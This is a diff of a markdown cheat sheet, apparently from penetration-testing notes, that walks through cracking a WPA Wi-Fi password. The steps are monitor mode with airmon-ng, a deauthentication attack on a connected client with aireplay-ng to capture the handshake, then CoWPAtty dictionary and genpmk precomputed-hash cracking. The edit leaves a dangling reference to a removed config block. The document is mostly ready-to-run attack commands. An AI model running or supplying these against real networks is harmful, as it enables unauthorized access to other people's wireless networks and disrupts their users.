@@ -2,46 +2,19 @@
 
 Use CoWPAtty to crack the password in either dictionary mode (plaintext) or hash mode. The latter is quicker.
 
-* Run `sudo apt-get install cowpatty` to install it
+## Commands
 
-## Setup
+* Run [reconnaissance](../reconnaissance.md) first
 
 ```bash
 # Install cowpatty/genpmk
-sudo apt-get install cowpatty
+* Run `sudo apt-get install cowpatty` to install it
 
-# Build an environment file for convenience
-vi config
-
-export BSSID=9C:53:22:03:18:E1
-export CHANNEL=3
-export CLIENT=DC:A6:32:E9:B6:BD
-export TAG=$SSID
-export PCAP=$TAG-01.cap
-export RAINBOW=$TAG-rainbow.lst
-export SSID=wifu
-export WORDLIST=/usr/share/john/password.lst
-
-# Save and source it
-source config
-```
-
-## Commands
-
-```bash
 # Start monitor mode
 sudo airmon-ng start wlan0
 
-# Start monitoring for APs
-sudo airodump-ng wlan0mon
-
-# Find target and collect BSSID,CHANNEL,CLIENT,SSID
-
-# Stop monitoring
-qq
-
 # Create and source config file as noted above
-# Start a screen session and do a horizonal split screen
+# Start a screen session with a horizonal split screen
 
 # Restart monitoring but filtered with output saved to PCAP. Make sure CLIENT is found.
 sudo airodump-ng -c $CHANNEL --bssid $BSSID -w $TAG --output-format pcap wlan0mon
@@ -51,6 +24,7 @@ sudo aireplay-ng -0 1 -a $BSSID -c $CLIENT wlan0mon
 
 # Wait for the four-way handshake to appear in airodump-ng window.
 # Stop airodump-ng when it appears
+qq
 
 # Check if four-way handshake is indeed valid
 cowpatty -r $PCAP -c
@@ -59,10 +33,11 @@ cowpatty -r $PCAP -c
 cowpatty -r $PCAP -f $WORDLIST -s $SSID
 
 # Crack the password in hash mode (fastest)
-## First - generate a word list. Include SSID since required.
+
+## Generate a RAINBOW table using a wordlist and filter by SSID
 genpmk -f $WORDLIST -d $RAINBOW -s $SSID
 
-## Second - crack the password in hash mode
+## Crack the password with the RAINBOW table and filter by SSID
 cowpatty -r $PCAP -d $RAINBOW -s $SSID
 ```
 ## References
